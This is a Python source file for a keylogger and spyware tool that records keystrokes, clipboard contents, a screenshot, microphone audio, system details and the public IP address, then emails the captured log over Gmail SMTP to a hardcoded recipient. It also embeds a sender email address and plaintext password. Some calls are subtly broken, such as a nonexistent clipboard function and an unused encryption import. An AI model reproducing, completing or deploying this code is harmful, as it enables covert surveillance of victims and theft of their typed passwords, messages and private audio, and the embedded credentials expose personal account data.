#All Libraries
#libraries for smtp server for sending E-mail
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#To get Computer information
import socket
import platform

#Library to capture keystrokes and screenshots
import win32clipboard
from pynput.keyboard import Key, Listener
import os

#
import time

#To read and write file
from scipy.io.wavfile import write

#To accesss microphone of system
import sounddevice as sd

#To encrypt file 
from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#E-mail Address of sender
email_address = "feyim44880@d3bb.com"
password = "43572916"

#E-mail Address of Receiver
toaddr = "sarveshband206@gmail.com"

#Log file to be created
system_information = "systeminfo.txt"
log_file_name = "log.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

#path of log file where it'll be saved
file_path = "C:\\Users\\sarve\\Desktop\\Python"
extend ="\\"

#system Information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

#Clipboard Information
def clipboard_info():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboard()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard Couldnot be copied:")

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


#email control

def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['FROM'] = fromaddr
    msg['TO'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_email"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()



#Functions to be executed
computer_information()

clipboard_info()

screenshot()

microphone()

try:
    send_email(log_file_name, file_path + extend + log_file_name, toaddr)
except:
    print("Can't send an E-mail")

count = 0
keys=[]


#Basic Keylogger
def on_press(key):
    global keys, count

    keys.append(key)
    count +=1

    if count >=1:
        count = 0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(file_path + extend + log_file_name, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()